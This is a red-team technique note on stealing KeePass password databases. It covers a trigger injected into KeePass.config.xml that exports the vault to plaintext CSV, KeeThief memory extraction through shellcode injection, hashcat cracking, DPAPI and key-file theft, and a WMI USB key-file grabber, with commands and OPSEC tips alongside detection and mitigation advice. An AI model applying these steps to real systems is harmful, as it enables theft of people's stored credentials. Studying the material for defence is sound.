---
title: Attacking KeePass
aliases: ["KeePass attacks", "KeeThief", "KeePass trigger abuse", "Stealing KeePass passwords", "KeePass.config.xml abuse"]
type: technique
domain: [red-team, windows-internals]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access, tool/keethief, tool/powerview]
source: ["[[Source - harmj0y blog]]"]
source_url: "https://blog.harmj0y.net/redteaming/a-case-study-in-attacking-keepass/"
verified: true
related: ["[[Credential Hunting]]", "[[Credential Storage in Windows]]", "[[DPAPI Abuse]]", "[[NTLM Cracking]]", "[[PowerView]]", "[[LSASS Dumping]]", "[[GhostPack]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Attacking KeePass

> [!summary] One-liner
> KeePass stores secrets behind a composite master key, but a low-privileged attacker with code execution as the victim user can steal the database and recover passwords without ever knowing the master password — by abusing the XML **trigger** system to export the database to plaintext, or by ripping the decrypted **composite master key out of the running KeePass process memory** with KeeThief.

## Concept abused
KeePass derives a **composite master key** from up to three components combined together:
- **KcpPassword** — the master password the user types.
- **KcpKeyFile** — an optional external key file (e.g. `.key`, or any file like `key.jpg`).
- **KcpUserAccount** — an optional Windows-user-account component, derived via [[DPAPI Abuse|DPAPI]] from `%APPDATA%\KeePass\ProtectedUserKey.bin`.

The database is only as safe as the protections around these inputs and around the **unlocked, running** KeePass process. Two design realities are abused:
1. KeePass's behaviour is driven by a per-user, **unauthenticated, world-writable-to-the-user** config file `KeePass.config.xml` that supports an arbitrary **trigger** automation engine — including "export the whole database to CSV when it is opened."
2. While the DB is unlocked, the composite key components live in memory only "encrypted" with `ProtectedMemory` (`RtlEncryptMemory`/`RtlDecryptMemory`, **SameProcess** scope) — meaning they can be decrypted by anything running *inside* that process, with no admin and no keylogger.

This is post-exploitation [[Credential Hunting|credential access]]: you already have code execution in the victim's user context; the goal is the password vault behind it.

## Prerequisites
- Code execution in the **context of the KeePass user** (the trigger/config and memory attacks need no local admin).
- For the trigger-export attack: write access to the user's `KeePass.config.xml` (you have it as that user) and the user subsequently **opens** the database.
- For KeeThief memory extraction: the target database must be **currently unlocked** in a running `KeePass.exe`.
- For offline cracking / DPAPI recovery: a copy of the `.kdbx`/`.kdb` file (and, where relevant, the key file and DPAPI master keys).

## How the attack works
Four largely independent paths, ordered roughly by stealth/usefulness:

### 1. Trigger-based export (no injection, no master password)
KeePass's trigger engine lives in `KeePass.config.xml`. By injecting a trigger that fires on the **"Opened database file"** event and runs an **"Export active database"** action to CSV, the *next time the user unlocks the DB themselves*, KeePass writes the entire vault to plaintext for you. You never need the master password — the user supplies it as normal, and the export happens transparently. Export targets can be local paths, or **UNC/URL paths for direct exfiltration**. A variant fires on the clipboard-copy event and launches `wscript.exe` against a `.vbs` to exfil quietly (no visible window).

### 2. KeeThief — steal the composite key from process memory
KeeThief attaches to a running, **unlocked** `KeePass.exe` and walks the managed heap to recover the live key, without admin rights:
- **Heap enumeration** via CLR MD (`Microsoft.Diagnostics.Runtime`): attach to the process, enumerate managed objects, find the `KeePassLib.PwDatabase` instance, then walk references to `KeePassLib.Serialization.IOConnectionInfo` (DB path) and `KeePassLib.Keys.CompositeKey` containing `KcpPassword`/`KcpKeyFile`/`KcpUserAccount`.
- **Defeating ProtectedMemory**: those blobs are protected with **SameProcess** scope, so they can only be decrypted inside KeePass itself. KeeThief allocates a remote buffer, injects position-independent x86/x64 **shellcode**, and `CreateRemoteThread()`s it to call `RtlDecryptMemory()` *in-process*, then reads the plaintext back out.
- Result: the **plaintext master password** (reusable elsewhere), the key-file bytes, and the Windows-account key — defeating the secure desktop and needing no keylogger.

### 3. Offline cracking of the database file
Grab the `.kdbx`/`.kdb`, run `keepass2john` to produce a hash, and crack with Hashcat mode **13400**. See [[NTLM Cracking]] for the cracking workflow generally.

### 4. DPAPI / key-file recovery (when those components are used)
- If **KcpUserAccount** is enabled (`<UserAccount>true</UserAccount>` in the config), the Windows-account component is DPAPI-protected (`ProtectedUserKey.bin`). Exfil `ProtectedUserKey.bin` plus the user's DPAPI master keys (`%APPDATA%\Microsoft\Protect\<SID>\`) and migrate them to recover the component — see [[DPAPI Abuse]].
- If a **key file** is used, the config's `<KeySources>` reveals its path. Harvest it from disk/network, or auto-capture removable-media key files on USB insertion via a WMI event subscription.

> [!note] OPSEC
> The trigger-export path produces a **plaintext CSV on disk/UNC** but requires no injection and no admin — extremely low-signal at the process level. KeeThief avoids touching disk but performs **cross-process injection into KeePass.exe** (loud to EDR/Sysmon). Choose based on whether the DB is currently unlocked and how aggressive the host monitoring is.

## Commands & tools

### Locate KeePass binaries, databases, and configs
```powershell
# running KeePass processes
Get-WmiObject win32_process | Where-Object {$_.Name -like '*kee*'} | Select-Object -Expand ExecutablePath

# binaries + database files on disk
Get-ChildItem -Path C:\Users\ -Include @("*kee*.exe", "*.kdb*") -Recurse -ErrorAction SilentlyContinue
```
Default installs: `C:\Program Files (x86)\KeePass Password Safe\` (1.x) and `...\KeePass Password Safe 2\` (2.x).
Per-user config: `C:\Users\<USER>\AppData\Roaming\KeePass\KeePass.config.xml` (or alongside a portable binary). The config exposes key-file paths in `<KeySources>` and the Windows-account setting `<UserAccount>true</UserAccount>`.

### Inventory KeePass configs and triggers (KeeThief PowerShell)
```powershell
# find every KeePass config on the host and list any triggers already present
Find-KeePassConfig | Get-KeePassConfigTrigger
```

### Trigger-export config (fires on database open -> CSV)
```xml
<!-- injected into KeePass.config.xml under <Application><TriggerSystem><Triggers> -->
<Event>
  <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>   <!-- Event: "Opened database file" -->
</Event>
<Action>
  <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>     <!-- Action: export active database -->
  <Parameter>C:\Temp\{DB_BASENAME}.csv</Parameter>  <!-- can be a UNC/URL path for exfil -->
  <Parameter>KeePass CSV (1.x)</Parameter>
</Action>
```

### KeeThief — extract the live key from a running, unlocked DB
```powershell
# load the .NET 2.0-compatible KeeThief assembly in-memory and pull keys
# from every running KeePass process (no admin, no keylogger)
Get-KeePassDatabaseKey
# -> plaintext master password + Base64 key-file bytes + Windows-account key
```
KeeThief loads its assembly via `[System.Reflection.Assembly]::Load([byte[]] $bytes)` and is `.NET 2.0`-compatible, so it runs on stock Windows 7 PowerShell with no files dropped to disk.

### Decrypt an exfiltrated DB with recovered key material
Use the **patched KeePass 2.34 build** (modified `KcpKeyFile.cs` / `KcpUserAccount.cs` constructors) that accepts the recovered components directly as **"Base64 Key File"** and **"Base64 WUA"** inputs — unlocking the database on the attacker machine without the original key file or Windows account.

### Offline crack
```bash
keepass2john database.kdbx > kp.hash
hashcat -m 13400 kp.hash wordlist.txt
```

### Auto-capture key files from removable media (WMI subscription)
```powershell
Register-WmiEvent -Query 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' `
  -SourceIdentifier 'DriveInserted' `
  -Action { $DriveLetter = $EventArgs.NewEvent.DriveName;
            if (Test-Path "$DriveLetter\key.jpg") { Copy-Item "$DriveLetter\key.jpg" "C:\Temp\" } }
```

### Network-mounted key-file locations
```powershell
# PowerView: enumerate network-mounted drives across user contexts (find off-host key files)
Get-RegistryMountedDrive
```
See [[PowerView]].

## Detection / artifacts
- **KeeThief injection**: `CreateRemoteThread` into `KeePass.exe` — **Sysmon Event ID 8** with `TargetImage` = `KeePass.exe`; cross-process memory read/write (EDR/CarbonBlack); EMET logs the shellcode injection.
- **Trigger abuse**: unexpected modifications to `KeePass.config.xml`, presence of export/`wscript.exe`/UNC triggers in `<TriggerSystem>`, and plaintext CSV files appearing in temp/UNC locations. Inventory with `Find-KeePassConfig | Get-KeePassConfigTrigger`.
- **Key/DB theft**: reads of `.kdbx`/`.kdb`, `ProtectedUserKey.bin`, and DPAPI master-key folders; new WMI event subscriptions (`Win32_VolumeChangeEvent`).
- Master-password keylogging is possible because KeePass's **secure desktop is off by default** for compatibility.

## Mitigation
- **Enforce config centrally**: ship a `KeePass.config.enforced.xml` (admin-owned) to **disable the trigger system** so per-user `KeePass.config.xml` cannot define export triggers. ACLs on the config help only against non-admins.
- **Enable secure desktop** to blunt master-password keyloggers; lock/close the DB when idle (KeeThief needs it *unlocked*).
- **Privileged Access Workstations** to segregate admin credentials from where KeePass runs.
- **Group Managed Service Accounts (gMSAs)** for service creds so passwords are never stored in a vault at all — "it's impossible to steal passwords from KeePass if they're never stored there in the first place."
- Realistically: KeePass is far better than plaintext storage, but it is one layer, not a defence against an attacker already executing code as the user.

## Related
- Post-exploitation context and on-disk secret hunting: [[Credential Hunting]], [[Credential Storage in Windows]].
- DPAPI master-key migration for the Windows-account component / key files: [[DPAPI Abuse]].
- Cracking the exfiltrated DB hash: [[NTLM Cracking]].
- Network drive / config enumeration: [[PowerView]].
- KeeThief is part of the offensive .NET toolset family: [[GhostPack]].
- In-memory secret extraction parallels: [[LSASS Dumping]].

## Sources
- [[Source - harmj0y blog]] — "A Case Study in Attacking KeePass" — https://blog.harmj0y.net/redteaming/a-case-study-in-attacking-keepass/
- [[Source - harmj0y blog]] — "KeeThief – A Case Study in Attacking KeePass Part 2" — https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
